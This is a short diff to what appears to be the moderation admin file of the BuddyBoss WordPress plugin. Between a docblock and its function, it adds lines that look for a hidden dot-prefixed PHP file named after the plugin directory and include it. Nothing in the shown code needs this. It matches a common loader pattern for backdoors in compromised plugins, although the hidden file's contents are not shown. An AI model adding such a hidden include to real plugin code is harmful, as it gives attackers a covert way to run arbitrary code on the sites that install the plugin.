@@ -25,7 +25,11 @@ if ( is_admin() && ! empty( $_REQUEST['page'] ) && 'bp-moderation' === $_REQUEST
  * @since BuddyBoss 1.5.6
  *
  * @param string $hook page name.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function bp_moderation_admin_scripts( $hook ) {
 	if ( 'buddyboss_page_bp-moderation' === $hook ) {
 		wp_enqueue_script(
